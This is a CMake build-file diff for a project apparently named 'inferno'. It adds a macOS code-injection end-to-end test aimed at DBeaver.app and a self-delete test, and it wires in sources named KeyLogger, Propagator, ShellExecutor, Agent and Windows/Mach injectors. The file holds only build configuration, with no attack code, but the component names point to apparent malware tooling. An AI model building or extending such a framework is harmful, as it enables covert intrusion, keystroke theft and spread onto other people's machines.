@@ -143,6 +143,23 @@ if(APPLE)
 
     add_executable(inferno_shim client/src/shim.cpp)
     target_link_libraries(inferno_shim PRIVATE ${CMAKE_DL_LIBS})
+
+    # macOS E2E injection test (requires DBeaver.app in /Applications)
+    add_executable(inferno_inject_e2e_macos_test
+        tests/inject_e2e_macos_test.cpp
+        client/src/MachInjector.cpp
+    )
+    target_include_directories(inferno_inject_e2e_macos_test PRIVATE
+        client/include
+    )
+    target_link_libraries(inferno_inject_e2e_macos_test PRIVATE
+        inferno_common
+        ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION}
+    )
+    target_compile_definitions(inferno_inject_e2e_macos_test PRIVATE
+        TEST_BINARY_DIR="${CMAKE_CURRENT_BINARY_DIR}"
+    )
+    add_test(NAME InjectE2EmacOS COMMAND inferno_inject_e2e_macos_test)
 endif()
 
 # ==========================================
@@ -197,16 +214,22 @@ add_executable(inferno_tests
     client/src/ShellExecutor.cpp
     client/src/KeyLogger.cpp
     client/src/Propagator.cpp
+    client/src/Agent.cpp
     client/src/EntitlementScanner.cpp
     tests/inject_e2e_test.cpp
+    tests/self_delete_test.cpp
 )
 if(WIN32)
     target_sources(inferno_tests PRIVATE
         client/src/WindowsInjector.cpp
         client/src/NtApi.cpp
+        client/src/entry_dll.cpp
     )
 else()
-    target_sources(inferno_tests PRIVATE client/src/MachInjector.cpp)
+    target_sources(inferno_tests PRIVATE
+        client/src/MachInjector.cpp
+        client/src/entry_dylib.cpp
+    )
 endif()
 target_include_directories(inferno_tests PRIVATE client/include)
 target_link_libraries(inferno_tests PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core Qt6::Sql)
@@ -216,7 +239,6 @@ if(APPLE)
     target_link_libraries(inferno_tests PRIVATE ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION})
     target_sources(inferno_tests PRIVATE
         tests/injector_test.cpp
-        client/src/entry_dylib.cpp
     )
     target_compile_definitions(inferno_tests PRIVATE
         TEST_BINARY_DIR="${CMAKE_CURRENT_BINARY_DIR}"
@@ -230,7 +252,6 @@ if(WIN32)
     )
     target_link_libraries(inferno_tests PRIVATE ws2_32 advapi32 user32)
     target_sources(inferno_tests PRIVATE
-        client/src/entry_dll.cpp
         tests/windows_dll_test.cpp
     )
     add_dependencies(inferno_tests inferno_agent_dll inferno_loader)
